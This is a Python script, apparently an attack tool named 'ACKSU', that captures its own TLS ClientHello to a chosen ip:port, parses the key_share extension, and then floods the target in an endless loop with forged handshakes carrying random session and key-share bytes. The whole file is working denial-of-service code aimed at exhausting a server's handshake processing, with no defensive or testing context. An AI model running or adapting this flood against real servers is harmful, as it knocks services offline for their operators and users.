import pyfiglet
from scapy.all import sniff
import socket
import ssl
import threading
import time
import random

ip = None
port = None
captured_packet = []
tcp_payload = b""
key_share_start = None
key_share_end = None

def print_banner():
    ascii_banner = pyfiglet.figlet_format("ACKSU")
    print(ascii_banner)

def set_address():
    global ip, port
    user_input = input()
    ip, port = user_input.split(":")

def capture_packet():
    global captured_packet, ip, port
    captured_packet = sniff(filter=f"dst host {ip} and dst port {port}", timeout=3, store=1)
    print(f"{len(captured_packet)} captured")

def make_socket():
    global ip, port
    tcp_socket = socket.create_connection((ip, port))
    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS)
    ssl_context.verify_mode = ssl.CERT_NONE
    ssl_context.check_hostname = False
    tls_socket = ssl_context.wrap_socket(tcp_socket, server_hostname=ip)
    tls_socket.close()
    tcp_socket.close()

def analyze_packet():
    global captured_packet, tcp_payload, key_share_start, key_share_end
    for analyzed_packet in captured_packet:
        if analyzed_packet.haslayer('TCP'):
            tcp_layer = analyzed_packet['TCP']
            if tcp_layer.payload:
                tcp_payload = bytes(tcp_layer.payload)
                if tcp_payload[0] == 0x16:
                    if tcp_payload[5] == 0x01:
                        session_id_length = tcp_payload[43]
                        cipher_suites_length = int.from_bytes(tcp_payload[5 + 4 + 2 + 32 + 1 + session_id_length:46 + session_id_length], 'big')
                        compression_methods_length = tcp_payload[46 + session_id_length + cipher_suites_length]
                        extensions_start = (47 + session_id_length + cipher_suites_length + compression_methods_length)
                        extensions_length = int.from_bytes(tcp_payload[extensions_start:extensions_start + 2], 'big')
                        extensions_end = extensions_start + 2 + extensions_length
                        extensions_data = tcp_payload[extensions_start:extensions_end]
                        key_share_relative_position = extensions_data.find(b'\x00\x33')
                        if key_share_relative_position != -1:
                            key_share_start = extensions_start + key_share_relative_position + 10
                            key_share_length = int.from_bytes(extensions_data[key_share_relative_position + 2:key_share_relative_position + 4], 'big')
                            key_share_end = key_share_start + 4 + key_share_length
                            keya = key_share_start
                            keyz = key_share_end
                            print("packet parsed")

def attack_target():
    global key_share_start, key_share_end, tcp_payload, ip, port
    keya = key_share_start
    keyz = key_share_end
    tls_raw = tcp_payload
    target_ip = ip
    target_port = port
    tring = 0
    while True:
        tring += 1
        bytesa = bytes([random.randint(0, 255) for _ in range(32)])
        bytesz = bytes([random.randint(0, 255) for _ in range(keyz - keya)])
        fake = tls_raw[:11] + bytesa + tls_raw[43:keya] + bytesz + tls_raw[keyz:]
        tcp_socket = socket.create_connection((target_ip, target_port))
        print(f"{tring} started")
        tcp_socket.send(fake)
        tcp_socket.shutdown(socket.SHUT_RDWR)
        print(f"{tring} ended")

if __name__ == "__main__":
    print_banner()
    set_address()
    capturing_packet = threading.Thread(target=capture_packet)
    capturing_packet.start()
    time.sleep(1)
    make_socket()
    capturing_packet.join()
    analyze_packet()
    attack_target()
